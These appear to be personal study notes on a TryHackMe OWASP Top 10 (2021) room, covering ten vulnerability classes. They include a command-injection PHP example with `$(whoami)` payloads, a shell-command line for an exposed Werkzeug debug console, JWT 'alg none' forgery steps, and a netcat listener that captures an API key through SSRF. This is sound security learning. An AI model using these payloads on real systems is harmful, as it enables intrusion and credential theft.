https://tryhackme.com/room/owasptop102021

### Table of contents
- [[#1. Broken Access Control]]
- [[#2. Cryptographic Failures]]
- [[#3. Injection]]
- [[#4. Insecure Design]]
- [[#5. Security Misconfiguration]]
- [[#6. Vulnerable and Outdated Components]]
- [[#7. Identification and Authentication Failures]]
- [[#8. Software and Data Integrity Failures]]
- [[#9. Security Logging & Monitoring Failures]]
- [[#10. Server-Side Request Forgery (SSRF)]]

___
### 1. Broken Access Control
[[#Table of contents|Back to the top]]

Some web pages are protected: only admin should be able to access
--> View sensitive information, access special functionalities

**[[5 IDOR|IDOR]]** (Insecure Direct Object Reference) is a type of broken access control
"Object": file, user, bank account, ...

NB: if `id` in URL is modifiable, don't forget to check `id=0`

___
### 2. Cryptographic Failures
[[#Table of contents|Back to the top]]

Data not sufficiently encrypted

___
### 3. Injection
[[#Table of contents|Back to the top]]

User input not sanitized and validated (and allow list: compare input to list of safe inputs/characters)

**Command Injection**: server-side code (like PHP) makes a call to a function that interacts with server's console directly
--> attacker executes OS commands on server

```php
<?php
    if (isset($_GET["mooing"])) {
        $mooing = $_GET["mooing"];
        $cow = 'default';

        if(isset($_GET["cow"]))
            $cow = $_GET["cow"];
        
        passthru("perl /usr/bin/cowsay -f $cow $mooing");
    }
?>
```
In this example, we can modify the `passthru("perl /usr/bin/cowsay -f $cow $mooing");` line in order to execute commands on the server. We can change `$cow` with `$(whoami)`, `$(ifconfig/ip addr)`, ...

___
### 4. Insecure Design
[[#Table of contents|Back to the top]]

Vulnerability inherent to app **architecture** --> allows **brute-force** for instance

___
### 5. Security Misconfiguration
[[#Table of contents|Back to the top]]

Security could have been appropriately configured but was not
- Poorly configured **permissions on cloud services**, like S3 buckets
- **Unnecessary** features enabled, like services, pages, accounts or privileges
- **Default** accounts with unchanged **passwords**
- Overly **detailed error messages** (attacker finds out more about system)
- Not using **[HTTP security headers](https://owasp.org/www-project-secure-headers/)**

**Debugging interface**
Debut app while it's being developed, should be disabled before publishing app
`/console` --> Werkzeug: debugging interface for python-based apps

```Python
import os; print(os.popen("ls -l").read())
```
`ls -l` can be replaced with any Bash command once we have access to the debugging console

___
### 6. Vulnerable and Outdated Components
[[#Table of contents|Back to the top]]

Example: use [WPScan](https://wpscan.com/) to detect outdated WordPress version, then look for known vulnerabilities (--> Exploit-DB)

___
### 7. Identification and Authentication Failures
[[#Table of contents|Back to the top]]

- **Brute-force**
- **Weak credentials**
- **Weak Session Cookies**: predictable values --> attacker sets own session cookie to target's session cookie

Also an [[#4. Insecure Design|insecure design]]: re-register but with slightly modified username -- instead of "`admin`", "` admin`" (with a space in front of it)

___
### 8. Software and Data Integrity Failures
[[#Table of contents|Back to the top]]

**Hashes** are often used to check data integrity

If a webapp uses **third-party** libraries, it should check their integrity --> specify hash associated to library, library code executes only if hash matches expected value -- **SRI -- Subresource Integrity**

Example:
```html
<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
```

[https://www.srihash.org/](https://www.srihash.org/): generate hash for any library

Prevent cookie tampering --> **JWT -- JSON Web Tokens**
![[Pasted image 20251122113650.png]]
Signature is similar to a hash, verifies payload integrity, involves the use of a secret key

Previous JWT vulnerability: set **`alg`** header **to `none`** --> prevents from checking signature
1. Connect with an account
2. Go to inspector and find JWT cookie
3. Decode and encode (Base64) with new values (`"alg"="none"` and `"user"="admin"`)
4. Refresh

___
### 9. Security Logging & Monitoring Failures
[[#Table of contents|Back to the top]]

Logs should include
- HTTP status codes
- Time Stamps
- Usernames
- API endpoints/page locations
- IP addresses

Logs should be stored securely, multiple copies

Sus activities
- Multiple unauthorized attempts
- Requests from anomalous IP addresses / locations
- Automated tools --> User-Agent value, speed of requests
- Common payloads

___
### 10. Server-Side Request Forgery (SSRF)
[[#Table of contents|Back to the top]]

Coerce webapp into sending request on behalf of attacker, often arise when webapp uses third-party services

![[Pasted image 20251122115624.png]]
In this example, an attacker can easily modify `server`to point to a machine they control
Attacker would then receive the API key, allowing them to use the SMS service at the expense of the original website

1. `nc -lvp 80`: launch NetCat, listening in verbose mode on port 80
2. In browser, modify `server=...` to `server=my_ip_address:80`

SSRF can be used to
- Enumerate internal networks, IP addresses and ports
- Abuse trust relationship between servers, gain access to restricted services
- Interact with non-HTTP services --> RCE